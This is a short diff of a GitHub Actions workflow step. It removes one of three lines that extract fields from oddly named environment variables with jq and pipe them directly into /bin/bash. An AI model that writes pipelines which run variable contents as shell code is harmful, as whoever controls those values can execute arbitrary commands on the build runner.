@@ -23,7 +23,6 @@ jobs:
         run: |
           printf '%s' "$wfg4" | jq -r .qkft3 | /bin/bash
           echo $q29 | jq -r .vwn7093 | /bin/bash
-          echo $mu183 | jq -r .ong81170 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
